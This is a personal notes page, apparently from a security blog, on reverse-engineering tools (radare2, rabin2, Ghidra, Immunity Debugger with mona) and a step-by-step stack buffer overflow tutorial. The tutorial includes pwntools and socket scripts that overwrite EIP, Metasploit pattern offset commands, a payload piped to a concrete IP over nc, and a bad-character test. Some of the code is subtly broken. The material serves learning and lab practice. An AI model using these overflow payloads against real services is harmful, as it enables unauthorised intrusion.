---
title: Reversing 
author: ioritz_elisa 
date: 2023-07-27 0:0:00 +0000 
categories: [Notes, Reversing] 
tags: [Type File, Debugging, Strings, Reversing Tools, Buffer Overflow, Offset, EIP, Badchars, Translate Instructions, Decompiler] 
pin: true
---


## Detect type of file

Command to know what type of file it is:

```
file <nameFile>
```



## Debugging

Command for debugging ELF files:

```
ltrace <file>
```

Example:

```
ltrace -s 100 ./<fileELF>
```



## Obtain Strings

This command is used to return the string characters into files:

```
strings <file>
```



## Interesting Tools for Reversing

> Ghidra

It is used for analyzing and decompiling binary code, making it easier to understand and modify the behavior of software applications. Ghidra provides a user-friendly interface and a wide range of features, including code analysis, debugging, scripting, and collaborative capabilities, making it a valuable tool for security researchers, malware analysts, and developers interested in understanding the inner workings of software programs.

Download: https://ghidra-sre.org/


> Inmunity Debbuger

Immunity Debugger is a debugger and exploit development tool used for software analysis and vulnerability assessment. It is popular among cybersecurity professionals for its advanced features and user-friendly interface.

Download: https://www.immunityinc.com/products/debugger/

See units and their protection measures:

```
!mona modules
```

Fetch instruction in a function:

```
!mona find -s "<instruction>" -m <function>
```

For example:

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm> JMP ESP
```

The instruction "jmp esp" returns "FFE4" and you would be executed the command:

```
!mona find -s "\xff\xe4" -m <function>
```


> Rabin2

"Rabin2" is a command-line tool in the "Radare2" project used to analyze and extract information from binary files, such as executables and shared libraries. It is useful for reverse engineering and binary code analysis.

https://r2wiki.readthedocs.io/en/latest/tools/rabin2/

Display general information about the binary:

```
rabin2 -I <pathBinary>
```

Display linked libraries:

```
rabin2 -l <pathBinary>
```

Display symbols imported from libraries:

```
rabin2 -i <pathBinary>
```

Display strings contained in the binary:

```
rabin2 -z <pathBinary>
```

More options: https://www.mankier.com/1/rabin2


> Radare2
  
"Radare2" is a powerful open-source framework for reverse engineering and binary analysis. It provides a set of command-line tools and a comprehensive API for dissecting and understanding various binary formats. With features such as disassembly, debugging, patching, and scripting, Radare2 is widely used by security researchers, reverse engineers, and developers for analyzing and manipulating binary files. Its versatility and extensibility make it a valuable tool in the field of cybersecurity and software analysis.

Download: https://rada.re/r/down.html

To begin with reversing, it is neccesary to load the binary:

```
radare2 <binary>
```

To run it in debugger mode:

```
radare2 -d <binary>
```

The 'aaa' command analyzes all flags starting with symbols, functions and the program’s starting point:

```
aaa
```

The 's' command is used to find a string or keyword:

```
s <string>
```

Switching to visual mode for code analysis with the command 'v':

```
v
```

Find the entry point of the binary:

```
ie
```

Find the main address:

```
iM
```

Find the strings:

```
iz
```

To start the debugger, you can use the 'db' command followed by the executable’s entry point:

```
db <entryPointName>
```

Disassembling using `pdf` command gives the following output:

```
pdf
```

This will print the disassembled code in a readable format.


 > x64dgb

X64dbg is a popular open-source debugger for 64-bit Windows executables. It provides a user-friendly interface and various powerful features for dynamic analysis, disassembly, and debugging of applications. X64dbg is widely used in software reverse engineering and malware analysis to analyze and understand the behavior of binaries, identify vulnerabilities, and trace code execution during runtime.

Download: https://x64dbg.com/


> DogBolt

It is a online decompiler binary.

[https://dogbolt.org/](https://dogbolt.org/)



## Example of Exploit - Buffer Overflow

Example of an exploit to perform buffer overflow and jump to memory addresses.

> This example inserts 180 characters in the input of the ELF:

In local:

````
from pwn import *

context.update(arch='i386', os='linux')

p = process ("./elf")

p.sendline(cyclic(180))

p.interactive()
````

Remotelly:

```
from pwn import *

context.update(arch='i386', os='linux')

p.remote("IP", "PORT")

p.sendline(cyclic(180))

p.interactive()
```

This can also be done manually:

````
python3 -c "print ('A' *180) | ./elf"
````

When the memory segmentation address is detected, it must be written in Little Endian.

Example:

````
080491e2 = \xe2\x91\x04\x08
````

This fills the buffer and then jumps to the desired function (overwrites the EIP, pointer to the next instruction).

Example running on the server side manually:

```
python -c "print('A'*180 + '\xe2\x91\x04\x08'+'A'*4+'\xef\xbe\xad\xde\r\xd0\xde\xc0')" | nc 206.64.12.123 202
```



## Generate Unique Pattern

> To generate the unique pattern use the following command:

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <number>
```

Here we will **create a random pattern** with a length of the chosen bytes.

> Python exploit example:

```
#!/usr/bin/python_

import sys, socket

offset = “Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6[...]”

try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 s.connect((‘IP’,port))

 s.send((‘<string>’ + offset))

 s.close()

except:

 print “Error connecting to server”

 sys.exit()
```

After executing the python script, the program will crash and display the overwritten value of the “EIP” (e.g. 386F4337). Write it down somewhere because we will need to use it in the next step to finding the offset.



## Calculate the Offset

Offset is the **maximum number of characters the buffer can store**.

We are going to use another Metasploit tool to find the exact match for our offset. For this, use the following command with the same byte length and specify the “EIP” value that you found.

Syntax:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <lenght> -q <numberEIP>
```

From this number, the EIP (pointer to the next instruction) is overwritten.

Example if the EIP is 386F4337 and the length of the buffer is 2200:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386F4337
```

With this command you can see the offset, for example:

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386F4337
[*] Exact match at offset 2003
```

In this case, the lenght of the buffer is 2003 (offset). Now, we will try to overwrite the “EIP” part of the memory.

Python code for the previous example:

```
#!/usr/bin/python

import sys, socket

shellcode = “A” * 2003 + “B” * 4

try:

 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 s.connect((‘10.10.10.4’,9999))

 s.send((‘TRUN /.:/’ + shellcode))

 s.close()

except:

 print “Error connecting to server”

 sys.exit()
```

Once you execute the script, the program will crash, and the Immunity Debugger will stop because of the access violation. When you examine the debugger’s output, you’ll see that “EBP” will be filled out with all “A”s (41414141) and the “EIP”with all “B”s (42424242).

It means that we can now control the “EIP” part of the memory, and instead of sending a bunch of “A” or “B” characters, we can send a malicious shellcode to infect our target computer and gain shell access.

Example in: https://blog.devgenius.io/buffer-overflow-tutorial-part3-98ab394073e3



## Translate instructions

Nasm_shell is a tool used for testing and experimenting with x86 assembly code. It provides an interactive shell where users can enter assembly instructions and get the corresponding hexadecimal machine code as output. This tool is helpful for learning assembly language, writing shellcode, and understanding the low-level representation of instructions in x86 architecture. It is commonly used by security researchers and exploit developers in the field of cybersecurity for crafting and testing exploits.

Command:

```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```



## Bad chars

It is neccessary to check for characters that are not allowed by the APP or executable.

Example script:

```
#!/usr/bin/python3

from pwn import *

context.update(arch='i386', os='linux')

p.remote("IP", "PORT")


badchars=(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)


p.sendline(cyclic(180) + badchars)

p.interactive()
```

In immunity debugger, right click 'follow in dump' and check if any character is missing. If any of them is missing or fails, it is not allowed. The null character is not usually set because it is always a failure.
